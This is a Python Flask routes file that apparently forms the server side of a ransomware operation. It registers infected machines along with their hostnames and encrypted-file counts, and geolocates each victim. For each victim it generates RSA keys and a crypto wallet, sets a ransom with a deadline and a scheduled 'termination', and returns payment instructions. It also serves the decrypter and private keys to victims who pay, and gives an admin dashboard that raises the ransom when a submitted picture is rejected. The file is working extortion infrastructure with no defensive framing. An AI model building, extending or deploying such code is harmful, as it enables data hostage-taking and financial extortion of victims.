from flask import render_template, request, redirect, url_for, flash, jsonify, make_response
from flask_login import login_user, current_user, login_required, logout_user
from application.models import *
from utilities.gen_rsa import gen_keys
from app import login_manager, csrf, limiter, app
from werkzeug.security import check_password_hash
from application.models import Users, UsersData
from utilities.get_ip import user_geolocation
from application.tasks import schedule_termination
from bleach import clean
from datetime import timedelta
from utilities.wallet_api import gen_wallet
from utilities.deadline import format_date
from utilities.instructions import instruct
import base64


@app.route("/new-user", methods=["POST"])
@csrf.exempt
def new_user():
    try:
        if 'HTTP_X_FORWARDED_FOR' in request.environ:
            user_ip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
        else:
            user_ip = request.remote_addr

        geolocation = user_geolocation(user_ip)
        data = request.json

        if not data:
            return jsonify({"error": "No data provided."}), 400

        required_keys = ["username", "hostname", "uid", "files"]
        if not all(key in data for key in required_keys):
            return jsonify({"error": "Missing required parameters."}), 400

        sanitized_data = {key: clean(value) for key, value in data.items()}
        existing_user = Users.query.filter_by(uid=sanitized_data["uid"]).first()
        if existing_user:
            return jsonify({"error": "UID already exists."}), 400

        keys = gen_keys()
        current_time = datetime.now().astimezone()
        expiration_date = datetime.now(tz=tz) + timedelta(hours=8)

        payment = 50
        if geolocation.get("country") == "Albania":
            payment = 100

        wallet = gen_wallet(sanitized_data.get("uid"))

        user = Users(
            username=sanitized_data.get("username"),
            hostname=sanitized_data.get("hostname"),
            uid=sanitized_data.get("uid"),
            email=sanitized_data.get("email"),
            ip_address=user_ip,
            public_key=keys[1],
            private_key=keys[0],
            crypto_address=wallet["wallet_address"],
            total_payment=payment,
            address_index=wallet["address_index"],
            creation_date=current_time,
            expiration=expiration_date
        )
        user_data = UsersData(
            uid=sanitized_data.get("uid"),
            files=sanitized_data.get("files"),
            ip=geolocation.get("IP"),
            city=geolocation.get("city"),
            region=geolocation.get("region"),
            country=geolocation.get("country"),
            postal=geolocation.get("postal"),
            latitude=geolocation.get("latitude"),
            longitude=geolocation.get("longitude"),
        )

        try:
            db.session.add(user)
            db.session.add(user_data)
            db.session.commit()
        except Exception as e:
            print(e)
            db.session.rollback()
            return jsonify({"error": "Database error"}), 400

        schedule_termination(user.id, expiration_date)
        instructions = instruct(str(payment), format_date(expiration_date), wallet["wallet_address"],
                                sanitized_data.get("files"), status=request.url_root, uid=sanitized_data.get("uid"))

        return jsonify({
            "message": "success",
            "public_key": keys[1],
            "data": instructions
        }), 201

    except Exception as e:
        print(e)
        db.session.rollback()
        return jsonify({"error": "An unexpected error occurred"}), 400


@app.route("/status/<uid>", methods=["GET", "POST"])
@csrf.exempt
@limiter.limit("1000 per 1 hour")
def status(uid):
    try:
        uid = clean(uid)
        user = Users.query.filter_by(uid=uid).first()
        if not (uid and user):
            return jsonify({"error": "Invalid UID or UID doesn't exist."}), 403

    except Exception as e:
        print(e)
        return jsonify({"error": "Request failed, try again."}), 400

    current_time = None
    time_diff = None
    remaining_time = None

    # Check if user exists and has a valid expiration
    if user and user.expiration:
        current_time = datetime.now(user.expiration.tzinfo)
        time_diff = user.expiration - current_time
        remaining_time = int(time_diff.total_seconds() * 1000)

    if request.method == "POST":
        try:
            image_data = request.form.get("imageData")
            image_data = base64.b64decode(image_data.split(",")[1])
            user.image = image_data
            user.pic_submit = True
            user.pic_id = False
            user.pic_rejected = False
            db.session.commit()

            return jsonify(status="success", message="Image has been submitted.")
        except:
            return jsonify(status="danger", message="Error occurred, try again.")

    return render_template("status.html", user=user, date=format_date,
                           current_time=current_time, time_diff=time_diff, remaining_time=remaining_time)


@app.route('/decrypter/<uid>', methods=['GET'])
@csrf.exempt
def download_decrypter(uid):
    try:
        uid = clean(uid)
        if not uid:
            return jsonify({"error": "Invalid UID."}), 403

        user = Users.query.filter_by(uid=uid).first()
        if not user:
            return jsonify({"error": "UID doesn't exist or not a paid user."}), 403

        script = Decrypter.query.first()
        if script:
            response = make_response(script.content)
            response.headers['Content-Type'] = 'application/octet-stream'
            response.headers['Content-Disposition'] = f'attachment; filename={script.filename}'
            return response
        else:
            return "No script available", 404
    except:
        return jsonify({"error": "An error occurred. Please try again later."}), 500


@app.route('/private-key/<uid>', methods=['GET'])
@csrf.exempt
def download_private_key(uid):
    try:
        uid = clean(uid)
        if not uid:
            return jsonify({"error": "Invalid UID."}), 403

        paid_user = UsersPaid.query.filter_by(uid=uid).first()
        if not paid_user:
            return jsonify({"error": "Invalid UID or UID doesn't exist."}), 403
        response = make_response(paid_user.private_key)
        response.headers['Content-Type'] = 'text/plain'
        response.headers['Content-Disposition'] = 'attachment; filename=private_key.txt'
        return response
    except:
        return jsonify({"error": "An error occurred. Please try again later."}), 500



@login_manager.user_loader
def load_user(user_id):
    return Administrator.query.get(int(user_id))


@app.route("/login", methods=["GET", "POST"])
@limiter.limit("50 per 1 hour")
def login():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        remember = True if request.form.get("remember_me") else False

        user = Administrator.query.filter_by(username=username).first()
        if user and check_password_hash(user.password, password):
            login_user(user, remember=remember)
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password.', 'danger')

    return render_template("login.html")


@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


@app.route("/dashboard", methods=["GET"])
@login_required
def dashboard():
    users_data = UsersData.query.all()
    max_files = max((user.files for user in users_data if user.files is not None), default=0)
    total_files = sum(user.files for user in users_data if user.files is not None)

    return render_template(
        "dashboard/dashboard.html",
        active_page='dashboard',
        users_data=users_data,
        max_files=max_files,
        total_files=total_files
    )


@app.route("/databases", methods=["GET", "POST"])
@login_required
def databases():
    users = Users.query.all()
    users_paid = UsersPaid.query.all()

    # Get counts and latest entry dates for Users table
    users_count = len(users)
    last_user_date = None
    if users_count > 0:
        last_user = Users.query.order_by(Users.creation_date.desc()).first()
        last_user_date = last_user.creation_date

    # Get counts and latest entry dates for UsersPaid table
    users_paid_count = len(users_paid)
    last_user_paid_date = None
    if users_paid_count > 0:
        last_user_paid = UsersPaid.query.order_by(UsersPaid.payment_date.desc()).first()
        last_user_paid_date = last_user_paid.payment_date

    return render_template(
        "dashboard/databases.html",
        active_page='databases',
        users=users,
        users_paid=users_paid,
        users_count=users_count,
        last_user_date=last_user_date,
        users_paid_count=users_paid_count,
        last_user_paid_date=last_user_paid_date
    )


@app.route("/script_editor", methods=["GET", "POST"])
@login_required
def script_editor():
    decrypter = Decrypter.query.first()  # Fetch the first record

    # If POST request, process form data and update the database
    if request.method == "POST":
        filename = request.form.get('filename')
        content = request.form.get('content')

        if not filename or not content:
            flash('Filename and content are required!', 'danger')
            return render_template("dashboard/script.html", decrypter=decrypter, active_page='script_editor')

        # Update or create new record based on whether decrypter exists
        if decrypter:
            decrypter.filename = filename
            decrypter.content = content
            decrypter.creation = datetime.now(tz=tz)  # Update the timestamp
        else:
            new_decrypter = Decrypter(filename=filename, content=content, creation=datetime.now(tz=tz))
            db.session.add(new_decrypter)

        db.session.commit()
        flash('Script updated successfully!', 'success')
        return redirect(url_for('script_editor'))

    return render_template("dashboard/script.html", decrypter=decrypter,
                           active_page='script_editor', date=format_date)


@app.route("/pictures", methods=["GET", "POST"])
@login_required
def pictures():
    users_data = Users.query.all()
    return render_template("dashboard/pictures.html", active_page='pictures', users_data=users_data)


@app.route('/approve-picture', methods=['POST'])
@csrf.exempt
@login_required
def approve_picture():
    data = request.get_json()
    uid = data.get('uid')

    # Fetch user and update the values
    user = Users.query.filter_by(uid=uid).first()
    if user:
        user.pic_id = True
        user.pic_submit = False
        user.pic_rejected = False
        db.session.commit()
        return jsonify(success=True)
    else:
        return jsonify(success=False, error="User not found")


@app.route('/reject-picture', methods=['POST'])
@csrf.exempt
@login_required
def reject_picture():
    uid = request.json.get('uid')
    user = Users.query.filter_by(uid=uid).first()
    if user:
        user.pic_id = False
        user.pic_submit = False
        user.pic_rejected = True
        user.total_payment += 50
        db.session.commit()
        return jsonify(success=True)
    else:
        return jsonify(success=False, error="User not found")



@app.errorhandler(429)
def ratelimit_error(e):
    return jsonify({"status": "error", "message": "Too many requests. Please slow down."}), 429


@app.template_filter('b64encode')
def b64encode_filter(data):
    return base64.b64encode(data).decode('utf-8')
